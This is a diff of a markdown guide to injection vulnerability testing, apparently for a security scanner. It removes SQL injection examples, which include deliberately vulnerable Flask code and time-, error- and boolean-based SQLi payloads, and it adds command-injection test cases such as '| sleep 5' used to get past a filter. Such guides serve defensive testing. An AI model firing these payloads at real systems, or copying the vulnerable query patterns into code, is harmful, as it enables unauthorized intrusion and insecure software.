@@ -3,160 +3,13 @@
 This file contains comprehensive examples of injection vulnerability testing, organized by injection type.
 
 ## Table of Contents
-1. [SQL Injection](#sql-injection)
-2. [OS Command Injection](#os-command-injection)
-3. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
-4. [NoSQL Injection](#nosql-injection)
-5. [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
-6. [LDAP Injection](#ldap-injection)
-7. [Test Result Types](#test-result-types)
-8. [Common Payloads Reference](#common-payloads-reference)
-
----
-
-## SQL Injection
-
-### Example 1: Time-Based Blind SQL Injection
-
-**Scenario**: User search endpoint with unparameterized query
-
-**Vulnerability**:
-```python
-# api/users.py - VULNERABLE
-@app.route('/api/users')
-def search_users():
-    user_id = request.args.get('id')
-    query = f"SELECT * FROM users WHERE id = {user_id}"  # No parameterization!
-    result = db.execute(query)
-    return jsonify(result)
-```
-
-**Test**:
-1. Baseline: `GET /api/users?id=123` → 200 OK (0.15s)
-2. Payload: `GET /api/users?id=123' OR SLEEP(5)--` → 200 OK (5.23s)
-3. Detection: Response time increased by ~5 seconds
-
-**Evidence**:
-```json
-{
-  "status": "VALIDATED",
-  "injection_type": "sql_injection_time_based",
-  "cwe": "CWE-89",
-  "baseline": {
-    "url": "http://target.com/api/users?id=123",
-    "method": "GET",
-    "status": 200,
-    "response_time_seconds": 0.15,
-    "response_hash": "sha256:abc123..."
-  },
-  "test": {
-    "url": "http://target.com/api/users?id=123' OR SLEEP(5)--",
-    "method": "GET",
-    "status": 200,
-    "response_time_seconds": 5.23,
-    "response_hash": "sha256:def456..."
-  },
-  "evidence": "Time-based SQLi: 5.08s delay with SLEEP(5) payload",
-  "payload_used": "123' OR SLEEP(5)--"
-}
-```
-
----
-
-### Example 2: Error-Based SQL Injection
-
-**Scenario**: Login form with verbose SQL errors
-
-**Vulnerability**:
-```python
-# api/auth.py - VULNERABLE
-@app.route('/login', methods=['POST'])
-def login():
-    username = request.form['username']
-    password = request.form['password']
-    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
-    try:
-        result = db.execute(query)
-    except Exception as e:
-        return jsonify({"error": str(e)}), 500  # Exposes SQL error!
-```
-
-**Test**:
-1. Baseline: `POST /login` with `username=admin&password=test` → 401
-2. Payload: `POST /login` with `username=admin'&password=test` → 500 with SQL error
-
-**Evidence**:
-```json
-{
-  "status": "VALIDATED",
-  "injection_type": "sql_injection_error_based",
-  "cwe": "CWE-89",
-  "baseline": {
-    "url": "http://target.com/login",
-    "method": "POST",
-    "status": 401,
-    "response_snippet": "{\"error\":\"Invalid credentials\"}"
-  },
-  "test": {
-    "url": "http://target.com/login",
-    "method": "POST",
-    "payload": "username=admin'&password=test",
-    "status": 500,
-    "response_snippet": "{\"error\":\"OperationalError: near \\\"admin\\\": syntax error\"}"
-  },
-  "evidence": "Error-based SQLi: SQL syntax error exposed in response",
-  "payload_used": "admin'"
-}
-```
-
----
-
-### Example 3: Boolean-Based Blind SQL Injection
-
-**Scenario**: Product search with injectable WHERE clause
-
-**Vulnerability**:
-```python
-# api/products.py - VULNERABLE
-@app.route('/api/products')
-def search_products():
-    category = request.args.get('category', '')
-    query = f"SELECT * FROM products WHERE category = '{category}' AND active = 1"
-    return jsonify(db.execute(query))
-```
-
-**Test**:
-1. True condition: `GET /api/products?category=electronics' OR '1'='1` → Returns all products
-2. False condition: `GET /api/products?category=electronics' OR '1'='2` → Returns only electronics
-3. Detection: Content length differs based on condition
-
-**Evidence**:
-```json
-{
-  "status": "VALIDATED",
-  "injection_type": "sql_injection_boolean_based",
-  "cwe": "CWE-89",
-  "baseline": {
-    "url": "http://target.com/api/products?category=electronics",
-    "status": 200,
-    "content_length": 1523
-  },
-  "test": {
-    "true_condition": {
-      "url": "http://target.com/api/products?category=electronics' OR '1'='1",
-      "status": 200,
-      "content_length": 45892
-    },
-    "false_condition": {
-      "url": "http://target.com/api/products?category=electronics' OR '1'='2",
-      "status": 200,
-      "content_length": 1523
-    }
-  },
-  "evidence": "Boolean-based SQLi: true condition returned 45892 bytes vs 1523 bytes",
-  "payload_used": "electronics' OR '1'='1"
-}
-```
+1. [OS Command Injection](#os-command-injection)
+2. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
+3. [NoSQL Injection](#nosql-injection)
+4. [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
+5. [LDAP Injection](#ldap-injection)
+6. [Test Result Types](#test-result-types)
+7. [Common Payloads Reference](#common-payloads-reference)
 
 ---
 
@@ -485,10 +338,10 @@ def search_users():
 ```json
 {
   "status": "UNVALIDATED",
-  "injection_type": "sql_injection",
+  "injection_type": "os_command_injection",
   "reason": "WAF blocking injection payloads",
   "test": {
-    "url": "http://target.com/api/users?id=123' OR SLEEP(5)--",
+    "url": "http://target.com/api/ping?host=127.0.0.1; sleep 5",
     "status": 403,
     "response_snippet": "{\"error\":\"Request blocked by security policy\"}"
   },
@@ -500,30 +353,30 @@ def search_users():
 
 ### Example 13: PARTIAL (Some Payloads Work)
 
-**Scenario**: Basic filtering bypassed by alternate payloads
+**Scenario**: Basic filtering bypassed by alternate command separators
 
 **Test**:
-1. `' OR SLEEP(5)--` → Blocked (filtered single quotes)
-2. `1 OR SLEEP(5)--` → 5 second delay (numeric context injection)
+1. `; sleep 5` → Blocked (filtered semicolon)
+2. `| sleep 5` → 5 second delay (alternate separator)
 
 **Test Result**:
 ```json
 {
   "status": "PARTIAL",
-  "injection_type": "sql_injection",
+  "injection_type": "os_command_injection",
   "tests": {
-    "quote_payload": {
-      "payload": "' OR SLEEP(5)--",
+    "semicolon_payload": {
+      "payload": "; sleep 5",
       "status": 400,
-      "note": "Single quote filtered"
+      "note": "Semicolon filtered"
     },
-    "numeric_payload": {
-      "payload": "1 OR SLEEP(5)--",
+    "pipe_payload": {
+      "payload": "| sleep 5",
       "response_time_seconds": 5.12,
-      "note": "Numeric injection works"
+      "note": "Pipe separator works"
     }
   },
-  "evidence": "Partial SQLi: quote filtering bypassed via numeric context",
+  "evidence": "Partial command injection: pipe separator bypassed semicolon filter",
   "requires_manual_review": true
 }
 ```
@@ -531,34 +384,6 @@ def search_users():
 ---
 
 ## Common Payloads Reference
-
-### SQL Injection Payloads
-
-**Time-Based:**
-```
-' OR SLEEP(5)--
-' WAITFOR DELAY '0:0:5'--
-' OR pg_sleep(5)--
-1; SELECT SLEEP(5)--
-```
-
-**Error-Based:**
-```
-'
-"
-`
-1'1
-1 AND 1=CONVERT(int,(SELECT @@version))--
-```
-
-**Boolean-Based:**
-```
-' OR '1'='1
-' OR '1'='2
-' AND '1'='1
-1 OR 1=1
-1 AND 1=2
-```
 
 ### Command Injection Payloads
 
@@ -653,7 +478,6 @@ Full list of injection-related CWEs from OWASP A03:2021 and A05:2025 (37 CWEs):
 | CWE-83 | XSS in Attributes | Yes |
 | CWE-86 | Improper Neutralization of Invalid Characters in Web Pages | Yes |
 | CWE-88 | Argument Injection | Yes |
-| CWE-89 | SQL Injection | Yes |
 | CWE-90 | LDAP Injection | Yes |
 | CWE-91 | XML/XPath Injection (Blind XPath) | Yes |
 | CWE-93 | CRLF Injection | Yes |
@@ -675,7 +499,6 @@ Full list of injection-related CWEs from OWASP A03:2021 and A05:2025 (37 CWEs):
 | CWE-470 | Unsafe Reflection | Partial |
 | CWE-493 | Critical Public Variable Without Final Modifier | No (SAST) |
 | CWE-500 | Public Static Field Not Marked Final | No (SAST) |
-| CWE-564 | Hibernate SQL Injection | Yes |
 | CWE-610 | Externally Controlled Reference | Yes |
 | CWE-643 | XPath Injection | Yes |
 | CWE-644 | HTTP Header Injection | Yes |
